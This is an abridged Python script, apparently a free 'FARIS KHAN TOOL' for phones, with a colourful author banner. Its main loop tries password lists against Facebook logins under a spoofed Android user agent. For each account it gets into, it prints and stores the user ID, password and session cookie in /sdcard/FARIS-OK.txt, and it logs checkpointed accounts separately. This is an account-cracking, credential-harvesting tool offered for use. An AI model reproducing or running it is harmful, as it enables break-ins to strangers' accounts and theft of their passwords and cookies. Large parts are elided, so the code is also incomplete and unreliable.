...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100063625322405')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
\033[1;37m================= \33[32;45mB F A R I S\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mzNASIR ABAS\33[0;m\033[1;32m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34mFARIS KHAN
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mZARYAB-404
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mFREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mM.NASIR-FARIS
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.2
\033[1;37m================= \33[32;45mFARIS KHAN\33[0;m =====================
 
       \33[37;41mWELLCOME TO FARIS KHAN TOOL\33[0;m
 
\033[1;37m================== \33[32;45mF.A.R.S\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
...
for xd in range(10000):
    ...
    l='Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(FARIS-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/FARIS-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(FARIS-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/FARIS-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[FARIS] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
